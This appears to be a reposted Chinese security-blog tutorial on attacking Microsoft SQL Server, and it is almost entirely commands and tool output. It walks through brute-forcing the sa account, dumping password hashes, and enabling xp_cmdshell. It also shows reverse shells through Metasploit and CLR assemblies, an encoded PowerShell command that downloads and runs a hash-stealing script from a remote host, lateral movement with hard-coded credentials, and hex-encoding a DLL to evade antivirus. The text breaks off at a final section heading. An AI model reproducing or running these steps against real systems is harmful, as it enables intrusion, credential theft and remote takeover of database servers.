<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/p9hr3vL2RW0PfDUI3-aX1g)<table><tbody><tr><td width="557" valign="top" height="62"><section><strong>声明：</strong>该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。</section><section>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。</section></td></tr></tbody></table>

来源：奇安信攻防社区，作者：kaeiy

原文：https://forum.butian.net/share/2705

现在只对常读和星标的公众号才展示大图推送，建议大家把潇湘信安 “设为星标”，否则可能看不到了！

**前言**

mssql 在渗透测试过程中屡见不鲜，本文基本包含了 mssql 网上能见到的所有利用方式，希望对大家有所帮助。  

  

**使用 nmap 进行 mssql 攻击**

Nmap 是基于 Lua 语言 NSE 脚本的集合，可与调用 ms-sql 的 NSE 脚本对目标系统进行扫描。可与使用以下脚本来查找 ms-sql 的 NSE 脚本。  

```
locate *.nse | grep ms-sql

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcrt5ghGcW3Cqvciaficm5aFk4ZEsM4L3AJYDPjeiazJpUmM0eYY0FS8qeQ/640?wx_fmt=png&from=appmsg)

###   

### **使用脚本对 mssql 版本信息进行扫描**

```
nmap -p 1433 --script ms-sql-info 192.168.3.130

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcfdyXbGaPPevpm2gGc2dFu5p9e7nyOBdazAshCJKjHbh6VGlHAosufQ/640?wx_fmt=png&from=appmsg)

  

### **对 mssql 进行暴力破解**

```
nmap -p1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=pass.txt 192.168.3.130

```

可与看到，爆破成功账号 sa:admin

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcw6FNH6D1N5ibKhtBNiaxxUAK3XbEq7YEcLCfyjWlnNWn3aZt5u7W2r2Q/640?wx_fmt=png&from=appmsg)

  

通过对脚本 NSE 文件进行 cat，可与查看脚本使用方法。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcqnm3lkGsJNicyUF9UQQ7cjICuKFXuubRHHIfv3k2ACzHxMGBwiaLW3iag/640?wx_fmt=png&from=appmsg)

  

### **使用 NetBIOS 进行枚举**

发送具有无效域和空凭据的 MS-TDS NTLM 身份验证请求将导致远程服务使用 NTLMSSP 消息进行响应，该消息公开信息，包括 NetBIOS、DNS 和操作系统版本。

```
nmap -p1433 --script ms-sql-ntlm-info 192.168.3.130

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYc4SsTRywvguHAoicuArOsJSjgypNlPxbJPKQE3OT63mhGHkGYqX1Bogw/640?wx_fmt=png&from=appmsg)

  

### **mssql 密码 hash 转储**

```
nmap -p1433 --script ms-sql-dump-hashes --script-args mssql.username=sa,mssql.password=admin 192.168.3.130

```

可与使用 hashcat，john 等进行破解。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcZtybDUhN3kwN4ASeGNXdgeicUOJrqsichFIsjMaMVhmujmO0ibCc28Vvg/640?wx_fmt=png&from=appmsg)

### **枚举数据库表**

```
nmap -p1433 --script ms-sql-tables --script-args mssql.username=sa,mssql.password=admin 192.168.3.130

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYc2IQ1uBvRyoFxYAu3VPfj1Ts86wPjyEiaUJ2K8DX1bvtw1gZlZNEty5A/640?wx_fmt=png&from=appmsg)

  

### **执行 xp_cmdshell（可能脚本原因导致执行未成功）**

```
nmap -p1433 --script ms-sql-xp-cmdshell --script-args mssql.user 192.168.3.130

```

### **执行 mssql 命令（可能脚本原因导致执行未成功）**

```
nmap -p1433 --script ms-sql-query --script-args mssql.user 192.168.3.130

```

**使用 msf 进行 mssql 攻击**

**定位 Mssql 服务器**  

```
msf6 > use auxiliary/scanner/mssql/mssql_ping 
msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 192.168.3.0/24
msf6 auxiliary(scanner/mssql/mssql_ping) > set threads 255
msf6 auxiliary(scanner/mssql/mssql_ping) > exploit

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYceIkdVGCVuLEp5GE1EnMR8uvlK4TCicW7bWZBq4poq9lwUuMUbHuMGKg/640?wx_fmt=png&from=appmsg)

### **密码破解**

```
use auxiliary/scanner/mssql/mssql_login
set rhosts 192.168.3.130
set user_file users.txt
set pass_file users.txt
set verbose false
exploit

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcicw9YtRul4V2kF3PtaFtoYMF3HI28nr5BsIE9dTxzV4H2tLg1ok6gGw/640?wx_fmt=png&from=appmsg)

### **获取 mssql 版本信息**

```
use auxiliary/admin/mssql/mssql_sql
set rhosts 192.168.3.130
set username sa
set password admin
exploit

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYckCpISDMiafZ3oUu8sibqIVgEQyJ8EKcbbY4XJjYEaoFMOzatmcSgcCibw/640?wx_fmt=png&from=appmsg)

### **枚举 mssql 信息**

可以看到数据库被授予了哪些权限、哪些登录可用以及其他有用的信息

```
use auxiliary/admin/mssql/mssql_enum
set rhosts 192.168.3.130
set username sa
set password admin
exploit

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcia7ax0Fon7gRe2EZJTE6cIDSGwkRCK5CJt18ueyWwoQaxz2fVtcesYw/640?wx_fmt=png&from=appmsg)

### **用户枚举**

查询 mssql 所有可以正确登录的用户

```
use auxiliary/admin/mssql/mssql_enum_sql_login
set rhosts 192.168.3.130
set username sa
set password admin
exploit

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYc3ZSbrb5qQickTtcPY5qicMQaa0Ns5TyVia70WkoRYVVnRJKpsXsERNoMQ/640?wx_fmt=png&from=appmsg)

### **捕获 mssql 登录**

创建一个虚假 mssql 服务器，捕获登录时的账号密码

```
use auxiliary/server/capture/mssql
set srvhost 192.168.3.133
exploit

```

尝试登录虚假服务器

```
sqsh -S 192.168.3.133 -U sa -P "admin"

```

### **Mssql Hash 转储**

```
use auxiliary/scanner/mssql/mssql_hashdump
set rhosts 192.168.3.130
set username sa
set password admin
exploit

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcj6dXC2r8ftlO0y4Q1pcQHZeEu3uBOnYPOInKsbIte3coDgMVf6KBFg/640?wx_fmt=png&from=appmsg)

### **通过 xp_cmdshell 反弹 shell**

```
use exploit/windows/mssql/mssql_payload
set rhosts 192.168.3.130
set username sa
set password admin
set method old
exploit

```

由于 mssql 服务器的系统版本较低，因此 method 选择为 old，否则可能反弹 Shell 失败

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYczmQdblLysd4WxVvZOpQViaA0Sd2XPiabicW5icK6ObUuicWmab573k7iagGw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcEE4g2O1BPEjINf3ebyETZVoLzibp2biaqkIjPK3OFKnd8E2s5l3soRTA/640?wx_fmt=png&from=appmsg)

### **执行系统命令**

```
use auxiliary/admin/mssql/mssql_exec
set rhosts 192.168.3.130
set username sa
set password admin
set cmd "net user"
exploit

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYc1ls8mmiaBCRFNicNA371oWt7nDhujh1Pg6EWsLic6V4Z3Xeiar79ANY5dg/640?wx_fmt=png&from=appmsg)

### **添加 mssql 用户**

创建 user.sql 文件，记住把密码设置复杂一点，否则数据库可能由于密码过于简单而添加失败

```
CREATE LOGIN test1 WITH PASSWORD = 'admin@123';
EXEC master..sp_addsrvrolemember @loginame = N'test1', @rolename = N'sysadmin'; //设置为管理员用户

```

```
use auxiliary/admin/mssql/mssql_sql_file
set rhosts 192.168.3.130
set username sa
set password admin
set sql_file user.sql
exploit

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcA1LKXShbYY44zU9fa2wmnzm7I7iaTQWAjuMAQlklYmWMOJ6HqXum9sw/640?wx_fmt=png&from=appmsg)

可以看到用户已经成功添加

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcbWW9n3MKcBBcicBkMMgpLdxOKJ87qegS39M2cD8spwm8SnwGQGFqKGA/640?wx_fmt=png&from=appmsg)

### **使用 CLR 执行命令反弹 Shell**

```
use exploit/windows/mssql/mssql_clr_payload
set payload windows/meterpreter/reverse_tcp
set rhosts 192.168.3.130
set username sa
set password admin
exploit

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYc0egmQmiagLP66JbK53yeC9VzIQL1MaTPz9MraXY0bud7E4cCFPRIzhA/640?wx_fmt=png&from=appmsg)

### **从 db_owner 到 sysadmin**

```
use admin/mssql/mssql_escalate_dbowner
set rhosts 192.168.3.130
set username test1
set password admin@123
exploit

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcwSf2nKuicMJ9iczf28Tj0hf75GrFib9QkYYzOFfLZQGibG5N1mmia2XuicjQ/640?wx_fmt=png&from=appmsg)

可以看到已经从只有 public 升级为 sysadmin

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcBaUNv4R3aHYUmxfu8YmfxAW3WfY1MmKMq8WvcRicpbiby9forTKglciaA/640?wx_fmt=png&from=appmsg)

### **模拟其他用户提权**

```
use auxiliary/admin/mssql/mssql_escalate_execute_as
set rhosts 192.168.3.130
set username test1
set password admin@123
exploit

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcZTahUIjiaGCxib2X92GdGh7ic613lDYXWYLXFtAadLd0nBWxCTKVSeMow/640?wx_fmt=png&from=appmsg)

**使用 xp_cmdshell 执行命令**

**启动 xp_cmdshell**  

```
/* 判断当前是否为 DBA 权限，返回 1 则可以提权 */
SELECT IS_SRVROLEMEMBER('sysadmin');
/* 查看是否存在 xp_cmdshell，返回 1 则存在 */
SELECT COUNT(*) FROM master.dbo.sysobjects WHERE xtype='x' AND name='xp_cmdshell'
/* 开启 xp_cmdshell */
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
/* 关闭 xp_cmdshell */
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE;

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcn7DpzOTggqTTF8NiandlTictGqicPgqW37DBL7IARDWMqyxC5cKIj9iaFA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYc03xPVS1mU3Mx2RxZmGWA7kicXZJTZJIxb9wb4GbRzun9cVRGuh372yg/640?wx_fmt=png&from=appmsg)

### **使用 sqsh 执行命令**

```
sqsh -S 192.168.3.130 -U sa -P "admin"
EXEC sp_configure 'show advanced options', 1;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
go
xp_cmdshell 'whoami';
go

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcvrvicQvPiceLKQRzheYX7XCiacemv56yeIEib6WqYk6QaFgGCic4picL0TTA/640?wx_fmt=png&from=appmsg)

### **mssqlcliient.py 连接 mssql**

```
python3 mssqlclient.py administrator:123456@192.168.3.129 -port 1433 -windows-auth
enable_xp_cmdshell
xp_cmdshell "net user"

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcyTSObGraUHicFh1Lpz3yJ8Z9ibN2x2LyIEIaBDdaBAOWMtAoqIW6kytg/640?wx_fmt=png&from=appmsg)

### **crackmapexec 调用 web_delivery 模块上线 Msf**

msf 启动 web_delivery 模块进行监听

```
use exploit/multi/script/web_delivery
set target 2
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.3.133
exploit

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcibqDKR010RagTsrgl1dVxTdOeXYNgc8CsVm7olX7WNRdUpsvx2OfCUA/640?wx_fmt=png&from=appmsg)

调用 crackmapexec 执行命令

```
crackmapexec mssql 192.168.3.129 -u 'administrator' -p '123456' -M web_delivery -o URL=http://192.168.3.133:8080/9SwSSB2rIZOWEP

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYctBI9NJibfjq4rI2f0mhCJ6yaCrOzUHSWiagODb3fzynicNiaTWP8YOxj6A/640?wx_fmt=png&from=appmsg)

### **搜集 mssql 的 sa 密码**

在目标网站目录下寻找 config 文件

```
# dir /b /s web.config >> tmps.logs
# del tmps.logs /F

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcTTfkZxs4dvAn0vhewJddfkVna34ymKibBWuWuEeUVDAbeYZXSuUHRog/640?wx_fmt=png&from=appmsg)

确认下 mssql 数据库连接的账号密码字段名 [如下, “User=”,“Password=” ], 因为后续我们需要根据这个字段名来批量撸 sa 的密码

```
type C:\WebCode\sycms_2.1\Web.config

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcs7P2iarn6zye9RTure0sIre4lGdxpeWIfSV60gJhm4YYLMtCpmHicFwg/640?wx_fmt=png&from=appmsg)

根据找到的特征批量抓密码

```
# findstr /c:"UserPassword=" /si web.config >> tmps.logs
# del tmps.logs /F

```

### **通过 HTTP 加密代理建立 tcp 连接**

```
python2 abpttsclient.py -u "http://192.168.3.13:84/abptts.aspx" -c webshell\config.txt -f 127.0.0.1:143/192.168.3.13:1433

```

将本地 143 端口转发到 1433，使用服务端工具连接即可

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYc2o9mHoV2Z44uO9VzpDEVpg2j4D0wztD4CukViacoyyrKfo1A0CibiaY0w/640?wx_fmt=png&from=appmsg)

**尝试启动 xp_cmdshell**

```
select @@version;
exec sp_configure 'show advanced options', 1;reconfigure;
exec sp_configure 'xp_cmdshell',1;reconfigure;
exec master..xp_cmdshell 'tasklist | findstr /c:"ekrn.exe" /c:"egui.exe" & whoami /user';
exec master..xp_cmdshell 'wmic OS get Caption,CSDVersion,OSArchitecture,Version';
exec master..xp_cmdshell 'wmic product get name,version';

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcCBoSbOQrp84EoLpzTvuE9tMnA0Ukia2ib0VP0e4ib1hHIdQPxrY8cRWZQ/640?wx_fmt=png&from=appmsg)

query user 查看一下最近登录的用户

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcMAfVyAlBgS3aScCvxG98nr8CK8h5RV06h9AACKrbaN0ZsEia9heytbg/640?wx_fmt=png&from=appmsg)

### **尝试远程加载 powershell 脚本抓取内网 hash**

```
PS C:\> $text = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.3.1/Get-PassHashes.ps1');Get-PassHashes;"
PS C:\> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
PS C:\> $EncodedText =[Convert]::ToBase64String($Bytes)
PS C:\> $EncodedText > bs64.txt

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcZVeH67JicdgK6nhIX1YgEvzYJ9X5uKzxLknz21osic1EYic8FPkLGaX5g/640?wx_fmt=png&from=appmsg)

将 bs64.txt 的内容复制出来放到 mssql 执行 powershell

```
exec master..xp_cmdshell 'powershell -exec bypass -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADMALgAxAC8ARwBlAHQALQBQAGEAcwBzAEgAYQBzAGgAZQBzAC4AcABzADEACgAnACkAOwBHAGUAdAAtAFAAYQBzAHMASABhAHMAaABlAHMAOwA=';

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcOaJhesD6pPykVeVf5hueeXkgyiajGkcL5abiawFduBcicQM1X2bOWoicpQ/640?wx_fmt=png&from=appmsg)

放 hashcat 跑跑或者彩虹表解密一下

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYc3tziclLwONeIBcv6mMjAe6jVPcuibSLGz1IvdrJp2bMpenjEBuaYq2Aw/640?wx_fmt=png&from=appmsg)

### **尝试上线 cs**

如果目标是站库分离可以这么搞，如果没有直接用蚁剑上传即可

```
# net use \\10.0.0.7\admin$ /user:"demo\administrator" "blackCeeeK#$%^2368"
# copy loader \\10.0.0.7\admin$\temp
# copy klsr \\10.0.0.7\admin$\temp\
# wmic /node:10.0.0.7 /user:"demo\administrator" /password:"blackCeeeK#$%^2368" PROCESS call create "c:\windows\temp\loader c:\windows\temp\klsr"
# del \\10.0.0.7\admin$\temp\loader /F
# del \\10.0.0.7\admin$\temp\klsr /F
# dir \\10.0.0.7\admin$\temp
# net use \\10.0.0.7\admin$ /del

```

### **rdp 利用**

查看开放端口

```
exec master..xp_cmdshell 'netstat -ano'

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcjT0Pn54JxRD3a4h7AJgTPs45fJoyxxDBmFZBVgaNhMzICt7QqxlibBA/640?wx_fmt=png&from=appmsg)

依然还是用 abptts 做下转发，即把本地的 389 转到内网 10.0.0.7 机器的 3389 端口上

```
python2 abpttsclient.py -u "http://192.168.3.13:84/abptts.aspx" -c webshell\config.txt -f 127.0.0.1:389/192.168.3.13:3389

```

查询 rdp 状态  

```
# reg query "hkey_local_machine\system\currentcontrolset\control\terminal server" /v fdenytsconnections
# reg query "hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\rdp-tcp" /v portnumber

```

开启或关闭目标 rdp  

```
# reg add "hkey_local_machine\system\currentcontrolset\control\terminal server" /v fdenytsconnections /t reg_dword /d 0 /f
# reg add "hkey_local_machine\system\currentcontrolset\control\terminal server" /v fdenytsconnections /t reg_dword /d 1 /f

```

win 2003 下防火墙放行 rdp 端口  

```
# netsh firewall add portopening tcp 3389 "remote desktop"
# netsh firewall delete portopening tcp 3389

```

win2008 之后系统防火墙放行 rdp 端口  

```
# netsh advfirewall firewall add rule  protocol=tcp dir=in localport=3389 action=allow
# netsh advfirewall firewall delete rule  dir=in protocol=tcp localport=3389

```

### **禁用 xp_cmdshell**

```
exec sp_configure 'show advanced options', 1;reconfigure;
exec sp_configure 'xp_cmdshell', 0;reconfigure;
exec master..xp_cmdshell 'whoami';

```

撸掉 mssql 所有账户的密码备用  

```
SELECT name, password_hash FROM master.sys.sql_logins

```

### **xp_cmdshell 被删除**

通过上传 xplog70.dll 恢复

```
Exec master.dbo.sp_addextendedproc 'xp_cmdshell','D:\\xplog70.dll'

```

**使用 CLR 程序集执行命令**

**启用 CLR 与 GUI 集成**

点击方面

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcn7DpzOTggqTTF8NiandlTictGqicPgqW37DBL7IARDWMqyxC5cKIj9iaFA/640?wx_fmt=png&from=appmsg)

将外围应用配置器的 ClrIntegrationEnabled 的值从 false 变为 true

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcibEHZsPeY8hbgvGzfw88Iia7vicb8CGSXDGdShuk4wd8p3eq0hrHibzicYA/640?wx_fmt=png&from=appmsg)

右键 msdb 选择属性，发现可信为 false 且无法修改

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcibEHZsPeY8hbgvGzfw88Iia7vicb8CGSXDGdShuk4wd8p3eq0hrHibzicYA/640?wx_fmt=png&from=appmsg)

使用命令将其设置为 true

```
ALTER DATABASE [msdb] SET TRUSTWORTHY ON

```

### **利用 CLR 程序集执行命令**

创建 c# 类库

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcU46mdSVRPk0qZyuG98ico7icWs722JQ8nRUTWiccia0ynAsTQbPydQBq2Q/640?wx_fmt=png&from=appmsg)

添加代码并且生成 DLL

```
using System;
using System.Data;
using System.Data.SqlClient;
using System.Data.SqlTypes;
using Microsoft.SqlServer.Server;
using System.IO;
using System.Diagnostics;
using System.Text;
public partial class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void cmd_exec(SqlString execCommand)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand.Value);
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();
        // Create the record and specify the metadata for the columns.
        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
        // Mark the beginning of the result set.
        SqlContext.Pipe.SendResultsStart(record);
        // Set values for each column in the row
        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
        // Send the row back to the client.
        SqlContext.Pipe.SendResultsRow(record);
        // Mark the end of the result set.
        SqlContext.Pipe.SendResultsEnd();
        proc.WaitForExit();
        proc.Close();
    }
};

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYccJZe1bdZETp9IB4Eu2cPK2CUzTsS0Gm9TVwINkZZwFSzUUbicxibqQ2Q/640?wx_fmt=png&from=appmsg)

在 msdb 数据库下新建程序集，导入生成的 dll 点击确定

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcGGkECYLmaBdQlJiatYCJvEiakeGvlAytZwia8eY0yD7eux3ibmyicLwibU9Q/640?wx_fmt=png&from=appmsg)

成功之后可以在程序集下看到导入的程序集

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcicuvY79hkDmNHp2b3pSJu56Bna1RXYMdjkLUyC5SPPLxmuPy69ibaVww/640?wx_fmt=png&from=appmsg)

使用以下命令创建过程

```
CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [shell].[StoredProcedures].[cmd_exec];
GO

```

执行命令即可  

```
cmd_exec 'whoami'

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYc5ibWWLqYfia7cokTlV5tXAjIf3sp0wEfHvXYErAgTZib4OlYeBKrCayQA/640?wx_fmt=png&from=appmsg)

尝试使用命令行来添加 clr，首先删除刚添加的程序集和过程

```
DROP PROCEDURE cmd_exec
DROP ASSEMBLY shell

```

选择调用的数据库  

```
use msdb

```

启用 CLR 集成  

```
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE
GO

```

查询是否启用了 CLR 集成，value 为 1 则为开启  

```
SELECT * FROM sys.configurations WHERE name = 'clr enabled'

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYckV6Wx4nqM6gMWJvSw3aWyyMZgDuW5qiaIAiamdtH9776a9KxiaUItEsNQ/640?wx_fmt=png&from=appmsg)

启用可信任

```
ALTER DATABASE msdb SET TRUSTWORTHY ON

```

查询是否执行成功，为 1 则开启  

```
select name, is_trustworthy_on from sys.databases

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcR1P0cpXDS6DEMB3t8FIbib9DAFoASj8gg6nic2NZU9AefExy3gNIqqCw/640?wx_fmt=png&from=appmsg)

使用命令创建程序集

```
CREATE ASSEMBLY shell
FROM 'c:\temp\shell.dll'
WITH PERMISSION_SET = UNSAFE;

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcHX2C61TaXFJysvhCic3XgvZNPa55jCKosD8IwFMic5oibFVdo59T50aBA/640?wx_fmt=png&from=appmsg)

创建过程

```
CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [shell].[StoredProcedures].[cmd_exec];
GO

```

成功执行命令

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcib7hKEJoicicp2G8zSrMEqicPBbtQ4iaibR7q9YK03iaqhia6npskgicT43nfQg/640?wx_fmt=png&from=appmsg)

### **16 进制 Dll 转换**

由于 dll 可能会被查杀，尝试转换为 16 进制导入，使用以下 ps1 脚本转换 dll

```
# Target file
$assemblyFile = "C:\\Users\\administrator\\Desktop\\cmd_exec.dll"
# Build top of TSQL CREATE ASSEMBLY statement
$stringBuilder = New-Object -Type System.Text.StringBuilder 
$stringBuilder.Append("CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM `n0x") | Out-Null
# Read bytes from file
$fileStream = [IO.File]::OpenRead($assemblyFile)
while (($byte = $fileStream.ReadByte()) -gt -1) {
    $stringBuilder.Append($byte.ToString("X2")) | Out-Null
}
# Build bottom of TSQL CREATE ASSEMBLY statement
$stringBuilder.AppendLine("`nWITH PERMISSION_SET = UNSAFE") | Out-Null
$stringBuilder.AppendLine("GO") | Out-Null
$stringBuilder.AppendLine(" ") | Out-Null
# Build create procedure command
$stringBuilder.AppendLine("CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];") | Out-Null
$stringBuilder.AppendLine("GO") | Out-Null
$stringBuilder.AppendLine(" ") | Out-Null
# Create run os command
$stringBuilder.AppendLine("EXEC[dbo].[cmd_exec] 'whoami'") | Out-Null
$stringBuilder.AppendLine("GO") | Out-Null
$stringBuilder.AppendLine(" ") | Out-Null
# Create file containing all commands
$stringBuilder.ToString() -join "" | Out-File C:\Users\administrator\Desktop\\dll_hex.txt

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcf7TQx7yobpWXrLWjsoorOTg5dfj3mhiaibDayu6XsuwAHK90JHRLJJeg/640?wx_fmt=png&from=appmsg)

或使用 PowerUpSql 生成更加方便

```
powershell
powershell -ep bypass
Import-Module .\PowerUpSQL.ps1
Create-SQLFileCLRDll -ProcedureName “runcmd” -OutFile runcmd -OutDir C:\Users\administrator\Desktop\

```

会在指定位置生成 3 个文件，直接调用即可  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYc3fg3g9rKGyJuVicpWQ1gn9DOsMywQM63fibseIsRy2iaicUB9b32uyguLw/640?wx_fmt=png&from=appmsg)

### **使用 PowerUpSQL 远程调用执行 CLR**

```
Invoke-SQLOSCmdCLR -Username sa -Password 'admin' -Instance "192.168.3.130,1433" -Command 'net user' -Verbose | Out-GridView

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcAxjsBCj55yj8PdL8PxEFg8R6MHibXzzaAYyyiaCiaMydOe9H5arbMdJaQ/640?wx_fmt=png&from=appmsg)

### **使用 msf 配合 PowerUpSQL 上线**

```
use exploit/windows/misc/hta_server
set srvhost 192.168.3.133
exploit

```

执行命令  

```
Invoke-SQLOSCmdCLR -Username sa -Password 'admin' -Instance "192.168.3.130,1433" -Command 'mshta.exe http://192.168.3.133:8080/GzoD8Ou5ltc.hta'

```

### **使用 msf clr 模块上线**

```
use exploit/windows/mssql/mssql_clr_payload
set rhosts 192.168.3.130
set username sa
set password admin
set payload windows/meterpreter/reverse_tcp
exploit

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcF8oiaS39ibHxWQn0GTur9ja8jX2VRRezSptOvffXeLcOSLUeoiaoal9sw/640?wx_fmt=png&from=appmsg)

### **WarSQLKit**

```
